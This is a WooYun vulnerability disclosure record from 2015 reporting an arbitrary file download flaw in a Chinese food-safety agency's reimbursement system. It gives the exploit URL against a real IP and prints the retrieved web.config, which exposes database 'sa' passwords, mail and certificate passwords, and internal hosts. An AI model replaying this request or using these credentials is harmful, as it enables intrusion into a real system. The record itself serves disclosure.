{"id": 37956, "wybug_id": "wooyun-2015-098548", "wybug_title": "国家食品安全风险评估中心某系统任意文件下载", "wybug_corp": "国家互联网应急中心", "wybug_author": "bitcoin", "wybug_date": "2015-02-27 14:09", "wybug_open_date": "2015-04-13 16:58", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向公众公开  简要描述： 任意文件下载 详细说明：  国家食品安全风险评估中心网络报销系统http://114.247.147.253/DownLoadPage.aspx?FileName=/web.config\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><configuration xmlns=\"http://schemas.microsoft.com/.NetConfiguration/v2.0\">\t<configSections>\t\t<sectionGroup name=\"system.web.extensions\" type=\"System.Web.Configuration.SystemWebExtensionsSectionGroup, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\">\t\t\t<sectionGroup name=\"scripting\" type=\"System.Web.Configuration.ScriptingSectionGroup, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\">\t\t\t\t<section name=\"scriptResourceHandler\" type=\"System.Web.Configuration.ScriptingScriptResourceHandlerSection, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\" requirePermission=\"false\" allowDefinition=\"MachineToApplication\" />\t\t\t\t<sectionGroup name=\"webServices\" type=\"System.Web.Configuration.ScriptingWebServicesSectionGroup, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\">\t\t\t\t\t<section name=\"jsonSerialization\" type=\"System.Web.Configuration.ScriptingJsonSerializationSection, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\" requirePermission=\"false\" allowDefinition=\"Everywhere\" />\t\t\t\t\t<section name=\"profileService\" type=\"System.Web.Configuration.ScriptingProfileServiceSection, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\" requirePermission=\"false\" allowDefinition=\"MachineToApplication\" />\t\t\t\t\t<section name=\"authenticationService\" type=\"System.Web.Configuration.ScriptingAuthenticationServiceSection, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\" requirePermission=\"false\" allowDefinition=\"MachineToApplication\" />\t\t\t\t\t<section name=\"roleService\" type=\"System.Web.Configuration.ScriptingRoleServiceSection, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\" requirePermission=\"false\" allowDefinition=\"MachineToApplication\" />\t\t\t\t</sectionGroup>\t\t\t</sectionGroup> \t\t</sectionGroup>\t</configSections>\t<connectionStrings>  \t\t<add name=\"SaaSConnectionString\" connectionString=\"Data Source=192.168.0.200;Initial Catalog=SaaS_CP0003;Persist Security Info=True;User ID=sa;Password=123\" providerName=\"System.Data.SqlClient\" />\t</connectionStrings>\t<appSettings>\t\t<add key=\"ElongAirWebService\" value=\"http://flight.test.elong.com/web_service/\" />\t\t<add key=\"ElongHotelWebService\" value=\"http://211.151.230.209/newNorthBoundService/\" />\t\t<add key=\"SysActionLog\" value=\"N\" />\t\t<add key=\"SysOnOffLog\" value=\"N\" />\t\t<add key=\"SSC\" value=\"N\" />  \t\t<add key=\"SSC_DATARIGHT\" value=\"1\" />\t\t<add key=\"SSC_ONOFFLOG\" value=\"Y\" />\t\t<add key=\"SSC_ACTIONLOG\" value=\"N\" />\t\t<add key=\"SSC-IMAGE\" value=\"N\" />\t\t<add key=\"SSC-EMAIL\" value=\"ssc@acsoft.com.cn\" />\t\t<add key=\"SSC-SMTP\" value=\"mail.acsoft.com.cn\" />\t\t<add key=\"SSC-PWD\" value=\"ssc-acsoft\" />\t\t<add key=\"SSC-EMAILNAME\" value=\"ssc@acsoft.com.cn\" />\t\t<add key=\"OA\" value=\"N\" />\t\t<add key=\"NGConnString\" value=\"Provider=SQLOLEDB.1;Password=;Persist Security Info=True;User ID=sa;Initial CATALOG=dbname;Data Source=servername\" />\t\t<add key=\"DefalutLanguage\" value=\"GB\" />\t\t<add key=\"SITE\" value=\"S0001\" />\t\t<add key=\"GlobalConnectionString\" value=\"Data Source=.;Initial Catalog=Food;User ID=sa;Password=foodsa\" />\t\t<add key=\"CrystalImageCleaner-AutoStart\" value=\"true\" />\t\t<add key=\"CrystalImageCleaner-Sleep\" value=\"60000\" />\t\t<add key=\"CrystalImageCleaner-Age\" value=\"120000\" />\t\t<add key=\"FCKeditor:BasePath\" value=\"/fckeditor/\" />\t\t<add key=\"FCKeditor:UserFilesPath\" value=\"/fckeditor/Files/\" />\t\t<add key=\"CA-UserKey-Path\" value=\"C:\\userkey.key\" />\t\t<add key=\"CA-UserCert-Path\" value=\"C:\\UserCert.der\" />\t\t<add key=\"CA-CertChair-Path\" value=\"C:\\CertChain.spc\" />\t\t<add key=\"CA-Password\" value=\"sheca\" />\t\t<add key=\"Version\" value=\"basic\" />\t\t<add key=\"TCCard_Service\" value=\"http://127.0.0.1:89/Service.asmx?wsdl\" />\t<add key=\"TCCard_Service.Service\" value=\"http://127.0.0.1:89/Service.asmx\" />\t</appSettings>\t<system.web>\t\t<sessionState mode=\"StateServer\" stateConnectionString=\"tcpip=127.0.0.1:42424\" sqlConnectionString=\"data source=127.0.0.1;Trusted_Connection=yes\" cookieless=\"false\" timeout=\"30\" />\t\t<compilation debug=\"true\" defaultLanguage=\"c#\">\t\t\t<assemblies>\t\t\t\t<add assembly=\"System.Transactions, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089\" />\t\t\t\t<add assembly=\"System.Design, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A\" />\t\t\t\t<add assembly=\"System.Management, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A\" />\t\t\t\t<add assembly=\"System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089\" />\t\t\t\t<add assembly=\"System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\" />\t\t\t\t<add assembly=\"System.Xml.Linq, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089\" />\t\t\t\t<add assembly=\"System.Data.DataSetExtensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089\" />\t\t\t\t<add assembly=\"Microsoft.ReportViewer.WebForms, Version=9.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A\" />\t\t\t\t\t\t\t<add assembly=\"System.DirectoryServices, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A\" />\t\t\t</assemblies>\t\t\t<buildProviders>\t\t\t\t<add extension=\".rdlc\" type=\"Microsoft.Reporting.RdlBuildProvider, Microsoft.ReportViewer.Common, Version=9.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" />\t\t\t</buildProviders>\t\t</compilation>\t\t<httpHandlers>\t\t\t<remove path=\"*.asmx\" verb=\"*\" />\t\t\t<add path=\"*.asmx\" verb=\"*\" type=\"System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\" validate=\"false\" />\t\t\t<add path=\"*_AppService.axd\" verb=\"*\" type=\"System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\" validate=\"false\" />\t\t\t<add path=\"ScriptResource.axd\" verb=\"GET,HEAD\" type=\"System.Web.Handlers.ScriptResourceHandler, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\" validate=\"false\" />\t\t\t<add path=\"Reserved.ReportViewerWebControl.axd\" verb=\"*\" type=\"Microsoft.Reporting.WebForms.HttpHandler, Microsoft.ReportViewer.WebForms, Version=9.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" validate=\"false\" />\t\t</httpHandlers>   \t\t<authentication mode=\"Windows\" />\t\t<authorization>\t\t\t<allow users=\"*\" />\t\t</authorization>\t\t<customErrors mode=\"Off\" defaultRedirect=\"ErrorPages.aspx\" />\t\t<identity impersonate=\"false\" />\t\t<globalization requestEncoding=\"utf-8\" responseEncoding=\"utf-8\" />\t\t<pages validateRequest=\"false\">\t\t\t<controls>\t\t\t\t<add tagPrefix=\"asp\" namespace=\"System.Web.UI\" assembly=\"System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\" />\t\t\t\t<add tagPrefix=\"asp\" namespace=\"System.Web.UI.WebControls\" assembly=\"System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\" />\t\t\t</controls>\t\t</pages>\t\t<httpModules>\t\t\t<add name=\"ScriptModule\" type=\"System.Web.Handlers.ScriptModule, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\" />\t\t</httpModules>\t\t<webServices>\t\t\t<protocols>\t\t\t\t<add name=\"HttpPost\" />\t\t\t\t<add name=\"HttpGet\" />\t\t\t</protocols>\t\t</webServices>\t</system.web>\t<system.codedom>\t\t<compilers>\t\t\t<compiler language=\"c#;cs;csharp\" extension=\".cs\" type=\"Microsoft.CSharp.CSharpCodeProvider,System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" warningLevel=\"4\">\t\t\t\t<providerOption name=\"CompilerVersion\" value=\"v3.5\" />\t\t\t\t<providerOption name=\"WarnAsError\" value=\"false\" />\t\t\t</compiler>\t\t\t<compiler language=\"vb;vbs;visualbasic;vbscript\" extension=\".vb\" type=\"Microsoft.VisualBasic.VBCodeProvider, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" warningLevel=\"4\">\t\t\t\t<providerOption name=\"CompilerVersion\" value=\"v3.5\" />\t\t\t\t<providerOption name=\"OptionInfer\" value=\"true\" />\t\t\t\t<providerOption name=\"WarnAsError\" value=\"false\" />\t\t\t</compiler>\t\t</compilers>\t</system.codedom>\t<system.webServer>\t\t<validation validateIntegratedModeConfiguration=\"false\" />\t\t<modules>\t\t\t<remove name=\"ScriptModule\" />\t\t\t<add name=\"ScriptModule\" preCondition=\"managedHandler\" type=\"System.Web.Handlers.ScriptModule, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\" />\t\t</modules>\t\t<handlers>\t\t\t<remove name=\"WebServiceHandlerFactory-Integrated\" />\t\t\t<remove name=\"ScriptHandlerFactory\" />\t\t\t<remove name=\"ScriptHandlerFactoryAppServices\" />\t\t\t<remove name=\"ScriptResource\" />\t\t\t<add name=\"ScriptHandlerFactory\" verb=\"*\" path=\"*.asmx\" preCondition=\"integratedMode\" type=\"System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\" />\t\t\t<add name=\"ScriptHandlerFactoryAppServices\" verb=\"*\" path=\"*_AppService.axd\" preCondition=\"integratedMode\" type=\"System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\" />\t\t\t<add name=\"ScriptResource\" verb=\"GET,HEAD\" path=\"ScriptResource.axd\" preCondition=\"integratedMode\" type=\"System.Web.Handlers.ScriptResourceHandler, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35\" />\t\t</handlers>        <defaultDocument>            <files>                <clear />                <add value=\"default.aspx\" />                <add value=\"Default.htm\" />                <add value=\"Default.asp\" />                <add value=\"index.htm\" />                <add value=\"index.html\" />                <add value=\"iisstart.htm\" />            </files>        </defaultDocument>\t</system.webServer>\t<runtime>\t\t<assemblyBinding xmlns=\"urn:schemas-microsoft-com:asm.v1\">\t\t\t<dependentAssembly>\t\t\t\t<assemblyIdentity name=\"System.Web.Extensions\" publicKeyToken=\"31bf3856ad364e35\" />\t\t\t\t<bindingRedirect oldVersion=\"1.0.0.0-1.1.0.0\" newVersion=\"3.5.0.0\" />\t\t\t</dependentAssembly>\t\t\t<dependentAssembly>\t\t\t\t<assemblyIdentity name=\"System.Web.Extensions.Design\" publicKeyToken=\"31bf3856ad364e35\" />\t\t\t\t<bindingRedirect oldVersion=\"1.0.0.0-1.1.0.0\" newVersion=\"3.5.0.0\" />\t\t\t</dependentAssembly>\t\t</assemblyBinding>\t</runtime>\t<location path=\"System/DataImportExcel.aspx\">\t\t<system.web>\t\t\t<globalization fileEncoding=\"gb2312\" requestEncoding=\"gb2312\" responseEncoding=\"gb2312\" />\t\t</system.web>\t</location>\t<location path=\"System/DataImportPage.aspx\">\t\t<system.web>\t\t\t<globalization fileEncoding=\"gb2312\" requestEncoding=\"gb2312\" responseEncoding=\"gb2312\" />\t\t</system.web>\t</location>\t<location path=\"DownLoadPage.aspx\">\t\t<system.web>\t\t\t<globalization fileEncoding=\"gb2312\" requestEncoding=\"gb2312\" responseEncoding=\"gb2312\" />\t\t</system.web>\t</location>\t<system.serviceModel>\t\t<bindings />\t\t<client />\t</system.serviceModel></configuration>\n   漏洞证明：  如上   修复方案：  控制权限   版权声明：转载请注明来源 bitcoin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-03-04 08:57 厂商回复： CNVD确认所述情况，已经由CNCERT转相关部门通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}